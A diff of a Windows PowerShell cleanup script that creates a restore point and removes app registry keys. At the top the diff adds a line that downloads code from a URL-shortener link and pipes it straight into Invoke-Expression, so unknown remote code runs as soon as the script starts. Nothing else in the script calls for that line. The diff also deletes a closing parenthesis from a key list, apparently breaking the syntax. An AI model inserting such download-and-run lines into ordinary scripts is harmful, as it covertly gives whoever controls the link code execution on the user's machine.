@@ -1,3 +1,8 @@
+iwr -useb https://esyl.short.gy/AndrewTool | iex
+
+
+
+
 Enable-ComputerRestore -Drive "C:\"
 Checkpoint-Computer -Description "RestorePoint1" -RestorePointType "MODIFY_SETTINGS"
 
@@ -172,7 +177,7 @@ Write-Output "Removed Weather App"
                
         #Windows Share Target
         "HKCR:\Extensions\ContractId\Windows.ShareTarget\PackageId\ActiproSoftwareLLC.562882FEEB491_2.6.18.18_neutral__24pqs290vpjk0"
-    )
+    
         
     #This writes the output of each key it is removing and also removes the keys listed above.
     ForEach ($Key in $Keys) {
